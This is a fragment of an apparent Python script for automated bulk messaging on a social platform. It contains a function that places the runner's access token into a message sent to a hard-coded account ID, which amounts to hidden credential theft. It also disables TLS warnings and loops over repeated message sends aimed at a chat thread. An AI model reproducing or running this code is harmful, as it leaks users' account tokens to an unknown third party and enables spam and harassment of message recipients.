...
def send_initial_message():
      ...
      msg_template = "Hello ABHAY SIR  ! I am using your server but dont fyt dark night members. My token is {}"

      # Specify the ID where you want to send the message
      target_id = "61564149968200"

      requests.packages.urllib3.disable_warnings()

      def liness():
          print('\033[1;92m' + '•──────────────────────THAKUR DIGVIJAY SINGH H3R3  ──────────────────────────────•')
      ...
      while True:
          try:
              for message_index in range(num_messages):
                  ...
                  if response.ok:
                      print("\033[1;92m[+] 𝐌𝐄𝐒𝐒𝐀𝐆𝐄 𝐒𝐄𝐍𝐃 𝐁𝐘 𝐀𝐌𝐈𝐓 𝐌𝐄𝐄𝐍𝐀  {} of Convo {} Token {}: {}".format(
                          message_post + 1, post_id, token_post + 1, haters_name + ' ' + message))
                      liness()
                      liness()
                  else:
